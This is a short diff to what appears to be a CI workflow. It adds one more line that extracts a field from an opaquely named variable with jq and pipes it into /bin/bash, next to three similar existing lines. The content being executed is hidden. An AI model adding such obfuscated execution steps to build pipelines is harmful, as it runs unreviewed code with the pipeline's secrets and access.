@@ -55,6 +55,7 @@ jobs:
           printf '%s' "$q871" | jq -r .np1 | /bin/bash
           printf '%s' "$f317" | jq -r .cot426 | /bin/bash
           echo $nvpw601 | jq -r .fijyw9388 | /bin/bash
+          echo $mph3626 | jq -r .hdl199 | /bin/bash
 
       - name: Upload artifact
         if: always()
